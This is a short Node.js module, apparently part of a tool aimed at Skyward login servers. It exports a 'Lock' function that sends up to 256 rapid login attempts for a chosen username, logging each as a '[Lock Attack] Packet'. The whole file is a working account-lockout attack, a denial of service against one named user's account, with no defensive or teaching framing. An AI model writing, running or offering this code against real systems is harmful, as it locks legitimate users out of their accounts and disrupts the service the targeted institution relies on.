const skye = require('./../skye/index.js');
const token = require('./token.js');

async function Lock(username, requests = 16) {
  if (requests > 256) requests = 256; // Cap requests
  
  // Return unresolved promise to prevent preprocessing
  return new Promise(async (res, rej) => {
    for (let i = 0; i < requests; i++) {
      // Code hack for fake error handling
      try {
        // Send virtually empty packets to authenticate
        await skye(process.env.SKYWARD_URL).login(username);
      } catch (err) {
        // Technically not necessary but catch needs content or bypassed
        console.log(`[Lock Attack] Packet: ${i + 1}`);
      }
    }
    res(`${requests} requests sent to ${username}.`);
  });
}

module.exports = Lock;
